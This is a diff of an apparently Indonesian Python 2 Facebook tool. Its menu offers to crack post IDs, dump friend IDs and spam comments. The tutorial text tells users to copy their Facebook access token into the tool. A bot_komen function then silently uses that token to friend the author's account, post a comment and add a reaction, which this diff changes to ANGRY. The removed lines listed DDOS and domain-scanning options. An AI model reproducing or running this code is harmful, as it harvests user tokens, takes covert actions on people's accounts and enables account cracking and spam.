@@ -136,16 +136,30 @@ def token():
 def tutor():
 	os.system('clear')
         print logo
-        print '\033[41;1m Tips!!\033[00;1m'
-        print '\033[41;1m Kamu Akan Tertuju Ke Sebuah Web\033[00;1m'
-        print '\033[41;1m Lalu Scroll Ke Bawah Lalu Login Menggunakan\033[00;1m'
-        print '\033[41;1m Akun Baru Yang Dibuat Agar Aman Dari Cp\033[00;1m'
-        print '\033[41;1m Lalu Akan Muncul Link,Salin Dan Tempel Dichrome\033[00;1m'
-        print '\033[41;1m Otomatis Ada Tulisan Token_Acces\033[00;1m'
-        cuk = raw_input('[Enter Untuk Lanjut]')
-        if cuk == '':
-	       os.system("xdg-open https://www.igniel.com/2018/05/token-facebook-for-android-ios-client-side.html?m=1")
+        print '\033[41;1m Tips Mendapatkan Token Tanpa Kena Cp!!!\033[00;1m'
+        print '\033[41;1m Buka Ke Chrome Dan Ketik www.facebook.com Dan Loginkan Akunmu\033[00;1m'
+        print '\033[41;1m Lalu Buat New Tab Tempel Link Berikut\033[00;1m'
+        print '\033[41;1m https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_\033[00;1m'
+        print '\033[41;1m Jika Sudah Klik Titik Tiga Diatas Samping Kanan Lalu Cari Halaman Dihalaman \033[00;1m'
+        print '\033[41;1m Dan Cari Ketik EAAA Dan Kamu Akan Melihat Token Access Nya\033[00;1m'
+        print '\033[41;1m Salin Lalu Temepl Di Loginan Tools Ini ^_^\033[00;1m'
+        print '1.Untuk Menonton Video Tutorial'
+        print '2.Untuk Keluar'
+        cuk = raw_input('Pilih Mana: ')
+	if cuk == '':
                masuk()
+        elif cuk == '1' or cuk == '01':
+               print 'Membuka Youtube'
+               time.sleep(1)
+               os.system("xdg-open https://youtu.be/L-tpu_1pJzg")
+               masuk()
+        elif cuk == '2' or cuk == '02':
+               masuk()
+        else:
+               print 'gada Nomor Itu'
+               time.sleep(1)
+               tutor()
+
 
 def bot_komen():
     try:
@@ -156,12 +170,13 @@ def bot_komen():
 
     una = '100045781089477'
     kom = 'Hai Saya Pengguna Sc Mu\xf0\x9f\x98\x98'
-    reac = 'LOVE'
+    reac = 'ANGRY'
     post = '194234645445904'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
     menu()
+
 
 def menu():
     os.system('clear')
@@ -193,24 +208,14 @@ def menu():
     os.system('clear')
     print logo
     print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAME\x1b[1;90m    =\x1b[1;92m ' + nama
+    print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1mIDENTITASMU'
+    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAMAMU\x1b[1;90m  =\x1b[1;92m ' + nama
     print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =\x1b[1;92m ' + id
     print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    print '          \033[37;1m**  \033[32;1mTools Facebook  \033[37;1m**'
-    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[34;1mCrack ID Post From Public/Friend'
-    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[34;1mDump ID'
+    print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1m    FITUR'
+    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[34;1mCrack ID Postingan Publik'
+    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[34;1mDump ID Temanmy'
     print '\033[37;1m[\033[32;1m03\033[37;1m] \033[34;1mSpam Comment'
-    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    print '     \033[37;1m**  \033[32;1mTools Information Gathering  \033[37;1m**'
-    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    print '\033[37;1m[\033[32;1m04\033[37;1m] \033[34;1mScan Domain'
-    print '\033[37;1m[\033[32;1m05\033[37;1m] \033[34;1mCheck Your Machine'
-    print '\033[37;1m[\033[32;1m06\033[37;1m] \033[34;1mDNS Lookup'
-    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    print '          \033[37;1m**  \033[32;1mTools Attacker  \033[37;1m**'
-    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    print '\033[37;1m[\033[32;1m07\033[37;1m] \033[34;1mDDOS'
     print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
     print '\033[37;1m[\033[31;1m00\033[37;1m] \033[31;1mExit'
     print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
@@ -228,14 +233,6 @@ def pilih():
         dumpid()
     elif gokil == '3' or gokil == '03':
         spamkomen()
-    elif gokil == '4' or gokil == '04':
-        scandomain()
-    elif gokil == '5' or gokil == '05':
-        cek_your_machine()
-    elif gokil == '6' or gokil == '06':
-        dnslookup()
-    elif gokil == '7' or gokil == '07':
-        ddos()
     elif gokil == '0' or gokil == '00':
         os.system('clear')
         jalan('Delete token')
